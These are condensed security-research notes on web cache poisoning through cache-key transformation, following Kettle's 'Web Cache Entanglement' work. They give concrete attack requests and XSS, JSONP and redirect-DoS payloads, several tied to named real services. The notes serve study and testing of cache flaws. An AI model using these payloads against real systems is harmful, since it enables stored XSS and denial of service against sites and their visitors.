# 04 — Cache-Key Transformation Attacks ("Web Cache Entanglement", Kettle 2020)

The input **is** part of the cache key, but the cache **transforms/normalizes/parses** it differently from the origin. Method: pick oracle → probe how the key transforms → find a gadget the transformed input reaches → poison.

## A. Unkeyed query string
Detect: `/?q=canary` reflects; `/?q=canary&cachebuster=1234` → HIT and reflection reverts to `/` = whole query excluded.
**Full-site takeover (newspaper XSS):**
```
GET //?"><script>alert(1)</script>    → cache key //, origin reflects query in og:url → stored XSS
```
The extra `/` is the situational-awareness (`dontpoisoneveryone`) guard; remove it + time it for the real (homepage) attack.
**Redirect DoS via query reflection (Cloudflare login):** pad query to max URI length on a cacheable redirect; the extra `/` in `Location: /login/?...` pushes the follow-up over the limit → `414`. CF patched query-reflecting-redirect caching; encoding (`%6c`) bypass then closed — look for any other transform applied before `Location`.

## B. Parameter cloaking
- **Varnish regex** removing `_=…`: `GET /search?q=help?_=payload&!&search=1` → regex strips `_=payload`, leaves `q=help?` poisoned. (Only params containing `?`.)
- **Akamai `akamai-transform`** excluded: `/en?x=1?akamai-transform=payload` — parser folds it into `x` but key stays `x=1`.
- **Rails `;` delimiter** (== `&`): on a system excluding `utm_content`:
```
GET /jsonp?callback=legit&utm_content=x;callback=alert(1)//
cache sees callback=legit; Rails sees 3 params, uses 2nd callback → poisoned JSONP.
```

## C. Unkeyed HTTP method
Cache treats GET/POST as equivalent:
```
POST /view/o2o/shop  Host: alijk.m.taobao.com
_wvUserWkWebView=a</script><svg onload='alert&lpar;1&rpar;'/data-
→ XSS reflected in JSON, cached under GET key. POST often less WAF-scrutinized.
```

## D. Fat GET requests
Cache ignores the body of a GET; origin (Rails/PHP) reads body params, overriding URL params. Vulnerable: Varnish (no builtin.vcl), Cloudflare, Rack::Cache.
**GitHub $10k:**
```
GET /contact/report-abuse?report=albinowax
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim     → cache key keeps ?report=albinowax; origin uses body
```
Also Zendesk login-CSRF via `return_to` body param. Gadget quality decides impact.

## E. Cache-key normalization (URL-decode in key)
Cache URL-decodes for the key; origin forwards raw ("in the same form").
**Firefox update takedown (download.mozilla.org):**
```
GET /%3fproduct=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1
cache key decodes %3f→? (matches real update URL); origin sees literal /%3f… → broken redirect cached → global update DoS.
```
**Encoded-XSS collision (cache magic trick):** browsers encode dangerous chars making reflected XSS "unexploitable", but the cache key normalizes both forms to one:
```
1) attacker sends  GET /?x=%22%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E  (cache stores UNENCODED response)
2) victim visits   GET /?x="/><script>alert(1)</script>  → X-Cache: HIT, unencoded XSS executes
```

## F. Cache-key injection
Poor escaping of composite key delimiters lets header data bleed into the key.
**Akamai:** `Origin: '-alert(1)-'__` → key `…cid=x=2__Origin='-alert(1)-'__`; then victim visits `/?x=2__Origin='-alert(1)-'` (same key, benign-looking) → reflected XSS. **Cloudflare** `${header:origin}::${scheme}://${host}${uri}` was theoretically injectable via `::` — now escaped/patched.

## G. Relative Path Overwrite (RPO) + poisoning
Resource files (JS/CSS) that reflect the query are perfect gadgets — control every page importing them, even cross-domain.
```
GET /style.css?x=a);@import…   → @import url(/site/home/index-part1.css?x=a);@import…
GET /foo.css?x=alert(1)%0A{}*{color:red;}   → error page echoes CSS; if importing page lacks <!DOCTYPE>, browser executes CSS anywhere in the HTML.
```

## H. Internal / fragment cache poisoning (DANGER)
Fragment caches have no real key — poisoning one fragment can poison **every** page (Adobe WP-Rocket: one request poisoned the whole site, no undo). Blind poisoning can hit pages you can't even reach (DoD intranet case). **Recognize it:** old+new canaries in one response; canaries on pages you never injected; inconsistent hostnames resolving to one app. **Safety:** only ever use attacker-owned hostnames; be ready to stop your Collaborator and notify the team.
